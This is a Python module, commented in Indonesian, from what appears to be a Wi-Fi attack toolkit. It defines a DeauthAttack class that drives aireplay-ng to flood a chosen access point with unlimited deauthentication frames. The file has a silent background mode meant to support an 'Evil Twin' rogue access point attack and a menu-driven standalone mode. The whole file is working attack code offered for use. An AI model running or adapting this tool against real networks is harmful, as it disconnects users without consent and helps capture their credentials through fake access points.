import os
import sys
import time
import subprocess

class DeauthAttack:
    def __init__(self, config, colors):
        self.config = config
        self.colors = colors

    def start_silent(self, bssid, ch, iface):
        """
        Versi integrasi untuk Evil Twin:
        Langsung nembak tanpa visualisasi progress bar (Background Mode)
        """
        c = self.colors
        
        # 1. Set Channel
        os.system(f"sudo iw dev {iface} set channel {ch}")
        
        # 2. Command Aireplay
        # Kita pake stdbuf agar output lancar dan dialirkan ke DEVNULL biar gak menuhin layar
        cmd = [
            "sudo", "aireplay-ng", 
            "-0", "0", 
            "-a", bssid, 
            "--ignore-negative-one", 
            iface
        ]
        
        print(f"  {c.INFO} {c.R}Deauth engine nembak {bssid} di background...{c.NC}")
        
        # Eksekusi sebagai process background
        process = subprocess.Popen(
            cmd, 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
        )
        return process

    def start_dos(self, targets):
        """
        Versi Standalone (Manual):
        Tetap ada visualisasi progress bar jika dipanggil dari menu utama
        """
        c = self.colors
        if not targets:
            print(f"\n{c.ERR} {c.R}Target list is empty. Scan first.{c.NC}")
            return

        try:
            print(f"\n{c.Q} Select Target ID (1-{len(targets)}):")
            val = input(f"  {c.DG}Selection > {c.NC}").strip()
            if not val: return
            
            target = targets[int(val) - 1]
            bssid = target.get('bssid')
            ch = target.get('ch')
            essid = target.get('essid', 'Unknown')
            iface = self.config.iface

            # Langsung eksekusi visual
            cmd = f"sudo iw dev {iface} set channel {ch} && sudo aireplay-ng -0 0 -a {bssid} --ignore-negative-one {iface}"
            self._execute_visual_attack(essid, bssid, cmd)

        except (ValueError, IndexError):
            print(f"{c.ERR} ID tidak valid.")

    def _execute_visual_attack(self, essid, bssid, cmd):
        """Logic tampilan progress bar untuk mode standalone"""
        c = self.colors
        print(f"\n  {c.BOLD}TARGET:{c.NC} {c.Y}{essid}{c.NC} ({bssid})")
        
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
        sent = 0
        try:
            while True:
                line = process.stdout.readline()
                if "Sending" in line: sent += 1
                bar = "░" * int((time.time()*5)%20) + "█"
                sys.stdout.write(f"\r  {c.OK} Status: [{bar:<20}] Sent: {c.Y}{sent:04d}{c.NC}")
                sys.stdout.flush()
                if process.poll() is not None: break
        except KeyboardInterrupt:
            process.terminate()
